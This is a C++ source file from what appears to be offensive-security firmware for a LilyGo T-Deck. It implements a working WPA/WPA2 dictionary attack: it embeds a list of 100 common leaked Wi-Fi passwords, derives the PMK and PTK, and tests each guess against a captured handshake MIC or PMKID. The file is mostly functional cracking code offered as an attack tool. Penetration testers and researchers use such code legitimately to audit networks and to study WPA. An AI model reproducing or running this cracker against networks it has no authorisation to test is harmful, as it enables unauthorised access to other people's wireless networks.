// T-REX — offensive security firmware for LilyGo T-Deck
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh

#include "wpa_crack.h"
#include <string.h>

namespace wpacrack {

// Top-100 real-world WPA passwords — SecLists/berzerk0 WPA breach data, all >= 8 chars.
const char* const kBuiltins[] = {
    "password",    "123456789",   "12345678",    "1q2w3e4r",    "sunshine",
    "football",    "1234567890",  "computer",    "superman",    "internet",
    "iloveyou",    "1qaz2wsx",    "baseball",    "whatever",    "princess",
    "abcd1234",    "starwars",    "trustno1",    "password1",   "jennifer",
    "michelle",    "mercedes",    "benjamin",    "11111111",    "samantha",
    "victoria",    "alexander",   "987654321",   "asdf1234",    "1234qwer",
    "qwertyuiop",  "q1w2e3r4",    "elephant",    "garfield",    "chocolate",
    "jonathan",    "caroline",    "maverick",    "midnight",    "88888888",
    "creative",    "qwerty123",   "cocacola",    "passw0rd",    "liverpool",
    "blink182",    "asdfghjkl",   "danielle",    "scorpion",    "veronica",
    "nicholas",    "asdfasdf",    "metallica",   "december",    "patricia",
    "christian",   "spiderman",   "security",    "slipknot",    "november",
    "jordan23",    "qwertyui",    "butterfly",   "swordfish",   "carolina",
    "hardcore",    "corvette",    "12341234",    "remember",    "qwer1234",
    "leonardo",    "snickers",    "williams",    "angelina",    "anderson",
    "123123123",   "pakistan",    "marlboro",    "kimberly",    "00000000",
    "snowball",    "sebastian",   "godzilla",    "hello123",    "champion",
    "precious",    "einstein",    "napoleon",    "mountain",    "dolphins",
    "charlotte",   "fernando",    "basketball",  "barcelona",   "87654321",
    "paradise",    "motorola",    "brooklyn",    "stephanie",   "elizabeth",
    "0123456789",
};
const int kBuiltinCount = sizeof(kBuiltins) / sizeof(kBuiltins[0]);

void derivePMK(const char* pass, const char* ssid,
               mbedtls_md_context_t* ctx, uint8_t pmk[32]) {
    mbedtls_pkcs5_pbkdf2_hmac(ctx,
        (const uint8_t*)pass, strlen(pass),
        (const uint8_t*)ssid, strlen(ssid),
        4096, 32, pmk);
}

// PTK data = min(ap,cl) || max(ap,cl) || min(an,sn) || max(an,sn)  (76 bytes)
static void buildPtkData(const uint8_t* ap, const uint8_t* cl,
                         const uint8_t* an, const uint8_t* sn, uint8_t* out) {
    if (memcmp(ap, cl, 6) < 0) { memcpy(out,    ap, 6);  memcpy(out + 6,  cl, 6);  }
    else                        { memcpy(out,    cl, 6);  memcpy(out + 6,  ap, 6);  }
    if (memcmp(an, sn, 32) < 0) { memcpy(out + 12, an, 32); memcpy(out + 44, sn, 32); }
    else                         { memcpy(out + 12, sn, 32); memcpy(out + 44, an, 32); }
}

// PRF-512: 4 × HMAC-SHA1(PMK, "Pairwise key expansion" || 0x00 || B || counter).
// out >= 80 bytes; KCK = out[0..15].
static void prf512(const uint8_t* pmk, const uint8_t* data, size_t dataLen, uint8_t* out) {
    static const char kLabel[] = "Pairwise key expansion";
    const size_t labelLen = sizeof(kLabel) - 1;   // 22
    uint8_t buf[100];                              // 22 + 1 + 76 + 1 = 100
    memcpy(buf, kLabel, labelLen);
    buf[labelLen] = 0x00;
    memcpy(buf + labelLen + 1, data, dataLen);
    const mbedtls_md_info_t* sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    for (int i = 0; i < 4; i++) {
        buf[labelLen + 1 + dataLen] = (uint8_t)i;
        mbedtls_md_hmac(sha1, pmk, 32, buf, labelLen + 1 + dataLen + 1, out + i * 20);
    }
}

bool verifyHandshake(const char* pass, const char* ssid,
                     const uint8_t apMac[6], const uint8_t staMac[6],
                     const uint8_t aNonce[32], const uint8_t sNonce[32],
                     const uint8_t* eapolFrame, uint16_t eapolLen, const uint8_t mic[16],
                     mbedtls_md_context_t* ctx, const mbedtls_md_info_t* sha1) {
    uint8_t pmk[32];
    derivePMK(pass, ssid, ctx, pmk);
    uint8_t ptkData[76];
    buildPtkData(apMac, staMac, aNonce, sNonce, ptkData);
    uint8_t ptkBuf[80];
    prf512(pmk, ptkData, 76, ptkBuf);
    uint8_t micCalc[20];
    mbedtls_md_hmac(sha1, ptkBuf /*KCK*/, 16, eapolFrame, eapolLen, micCalc);
    return memcmp(micCalc, mic, 16) == 0;
}

bool verifyPMKID(const char* pass, const char* ssid,
                 const uint8_t apMac[6], const uint8_t staMac[6], const uint8_t pmkid[16],
                 mbedtls_md_context_t* ctx, const mbedtls_md_info_t* sha1) {
    uint8_t pmk[32];
    derivePMK(pass, ssid, ctx, pmk);
    uint8_t data[20];
    memcpy(data,      "PMK Name", 8);
    memcpy(data + 8,  apMac,      6);
    memcpy(data + 14, staMac,     6);
    uint8_t hmac[20];
    mbedtls_md_hmac(sha1, pmk, 32, data, 20, hmac);
    return memcmp(hmac, pmkid, 16) == 0;
}

} // namespace wpacrack
